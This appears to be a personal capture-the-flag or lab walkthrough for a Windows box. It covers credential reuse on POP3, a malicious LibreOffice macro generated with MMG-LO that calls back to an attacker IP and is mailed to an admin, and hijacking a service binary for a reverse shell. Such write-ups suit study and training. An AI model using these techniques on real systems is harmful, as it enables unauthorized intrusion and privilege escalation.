#box

*Created: 2/7/2026*

### Step 1

**Tags:** #pop3 #Mail-Attacks #Credentials-Leak #Credential-Hunting

**Command:**
```bash
telnet 192.168.208.140 110
```

*Port: 110*

> 
> On port 8000 a website is hosted. Inside the website a list of users is shown. A suspicious string in latin is present below the name of a certain Jonas. After trying it out on the POP3 service we discover that the credentials are `jonas:SicMundusCreatusEst`

---

### Step 2

**Tags:** #libre-office #File-Macro-Attack #Mail-RCE #swaks #smtp

🔗 **URL/Link:** https://github.com/0bfxgh0st/MMG-LO/tree/main

**Command:**
```bash
python3 mmg-ods.py windows 192.168.45.229 11100
```

*Port: 25 | 💎 GEM*

> 
> Once inside the POP3 session, we discover 4 different emails. Precisely, one catches our attention, the one returned with `RETR 3` command (so the third email). It mention on the fact that the company is switching to LibreOffice and that all the spreadsheets and documents will be processed in the mail server. Knowing that we proceed on crafting a malicious LibreOffice file macro and then forward it to the mailadmin user. To do that, we leverage the library [MMG-LO](https://github.com/0bfxgh0st/MMG-LO/tree/main) which stands for (Malicious Macro Generatore - Libre Office)

---

### Step 3

**Tags:** #Service-Binary-Hijacking #wmic

**Command:**
```bash
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

*💎 GEM*

> 
> To escalate the privileges we notice a strange program installed called Veyon. After a quick investigation online an Unquoted Service Path vulnerability seems the most obvious. However, by being unable to write inside `C:\Users` we're unable to achieve command execution. After discovering we are the owner of that service we proceed to replace the `veyon-service.exe` binary with a malicious executable that grants us a reverse shell. Since we cannot restart the service, we're forced to `shutdown /r` the machine.

---

